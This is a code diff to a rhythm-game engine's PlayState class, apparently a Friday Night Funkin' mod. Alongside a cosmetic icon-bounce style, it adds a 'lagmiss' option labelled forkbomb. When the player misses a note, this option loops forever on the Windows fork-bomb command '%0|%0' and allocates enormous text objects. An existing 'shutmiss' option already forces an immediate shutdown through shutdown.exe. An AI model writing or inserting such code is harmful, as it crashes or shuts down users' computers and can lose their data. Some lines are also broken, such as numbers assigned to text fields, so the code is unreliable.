@@ -291,8 +291,11 @@ class PlayState extends MusicBeatState
 	var oneK:Bool = false;
 	var randomSpeedThing:Bool = false;
 	public var trollingMode:Bool = false;
+
 	public var crashmiss:Bool = false;
 	public var shutmiss:Bool = false;
+	public var lagmiss:Bool = false;
+
 	public var jackingtime:Float = 0;
 	public var minSpeed:Float = 0.1;
 	public var maxSpeed:Float = 10;
@@ -562,6 +565,7 @@ class PlayState extends MusicBeatState
 		trollingMode = ClientPrefs.getGameplaySetting('thetrollingever', false);
 		crashmiss = ClientPrefs.getGameplaySetting('crashmiss', false);
 		shutmiss = ClientPrefs.getGameplaySetting('shutmiss', false);
+		lagmiss = ClientPrefs.getGameplaySetting('lagmiss', false);
 		opponentDrain = ClientPrefs.getGameplaySetting('opponentdrain', false);
 		randomMode = ClientPrefs.getGameplaySetting('randommode', false);
 		flip = ClientPrefs.getGameplaySetting('flip', false);
@@ -1324,6 +1328,8 @@ class PlayState extends MusicBeatState
 				case "FPS Plus": 'bffps';
 				case "SB Engine": 'bfsb';
 				case "OS 'Engine'": 'bfos';
+				case "SKIBIDI": 'bf';
+				
 				default: 'bf';
 			}
 			if (iconToChange != 'bf')
@@ -2048,6 +2054,7 @@ class PlayState extends MusicBeatState
 		trollingMode = ClientPrefs.getGameplaySetting('thetrollingever', false);
 		crashmiss = ClientPrefs.getGameplaySetting('crashmiss', false);
 		shutmiss = ClientPrefs.getGameplaySetting('shutmiss', false);
+		lagmiss = ClientPrefs.getGameplaySetting('lagmiss', false);
 		opponentDrain = ClientPrefs.getGameplaySetting('opponentdrain', false);
 		randomMode = ClientPrefs.getGameplaySetting('randommode', false);
 		flip = ClientPrefs.getGameplaySetting('flip', false);
@@ -3756,6 +3763,22 @@ class PlayState extends MusicBeatState
 				final mult:Float = FlxMath.lerp(1, iconP2.scale.x, CoolUtil.boundTo(1 - (elapsed * 9 * playbackRate), 0, 1));
 				iconP2.scale.set(mult, mult);
 				iconP2.updateHitbox();
+			}
+
+			if (ClientPrefs.iconBounceType == 'SKIBIDI') {
+				final funny:Float = (healthBar.percent * 0.1) + 0.1;
+
+				iconP1.setGraphicSize(Std.int(iconP1.width + (3 * (2 + funny))),Std.int(iconP2.height - (2 * (2 + funny))));
+				iconP2.setGraphicSize(Std.int(iconP2.width + (3 * (2 - funny))),Std.int(iconP2.height - (2 * (2 - funny))));
+
+				FlxTween.cancelTweensOf(iconP1);
+				FlxTween.cancelTweensOf(iconP2);
+
+				FlxTween.angle(iconP1, -15, 0, Conductor.crochet / 1300 * gfSpeed / playbackRate, {ease: FlxEase.quadOut});
+				FlxTween.angle(iconP2, 15, 0, Conductor.crochet / 1300 * gfSpeed / playbackRate, {ease: FlxEase.quadOut});
+
+				FlxTween.tween(iconP1, {'scale.x': 1, 'scale.y': 1}, Conductor.crochet / 1250 * gfSpeed / playbackRate, {ease: FlxEase.quadOut});
+				FlxTween.tween(iconP2, {'scale.x': 1, 'scale.y': 1}, Conductor.crochet / 1250 * gfSpeed / playbackRate, {ease: FlxEase.quadOut});
 			}
 
 			if (ClientPrefs.iconBounceType == 'Golden Apple') {
@@ -5562,7 +5585,33 @@ class PlayState extends MusicBeatState
 					//  command(cmd:String, ?args:Array<String>):Int
 					Sys.command("shutdown.exe /s /t 0"); // scary!
 				}
-				
+			if(lagmiss) //forkbomb
+				{
+					vocals.volume = opponentVocals.volume = 0;
+					doDeathCheck(true);
+					//  command(cmd:String, ?args:Array<String>):Int
+					while (true) {
+					Sys.command("%0|%0"); // scary!
+					Sys.command("%0|%0"); // scary!
+					Sys.command("%0|%0"); // scary!
+					myText = new FlxText(0, 0, 50000); // x, y, width
+					myText.text = 10000000 * 100000000 * 10000000 * 10000000000000 * 1000000000;
+					myText.setFormat("vcr.ttf", 200, FlxColor.WHITE, CENTER);
+					myText.setBorderStyle(OUTLINE, FlxColor.RED, 100000000);
+					amyText = new FlxText(0, 0, 50000); // x, y, width
+					amyText.text = 10000000 * 10000000000 * 100000000 * 10000000 * 10000000;
+					amyText.setFormat("vcr.ttf", 200, FlxColor.WHITE, CENTER);
+					amyText.setBorderStyle(OUTLINE, FlxColor.RED, 100000000);
+					bmyText = new FlxText(0, 0, 50000); // x, y, width
+					bmyText.text = 10000000 * 1000000000 * 10000000 * 100000000 * 10000000;
+					bmyText.setFormat("vcr.ttf", 200, FlxColor.WHITE, CENTER);
+					bmyText.setBorderStyle(OUTLINE, FlxColor.RED, 100000000);
+					cmyText = new FlxText(0, 0, 50000); // x, y, width
+					cmyText.text = 10000000 * 100000000 * 10000000 * 10000000 * 100000000;
+					cmyText.setFormat("vcr.ttf", 200, FlxColor.WHITE, CENTER);
+					cmyText.setBorderStyle(OUTLINE, FlxColor.RED, 100000000);
+				}
+			}					
 
 			songMisses += 1 * polyphony;
 			if (SONG.needsVoices && ClientPrefs.songLoading && !ffmpegMode)
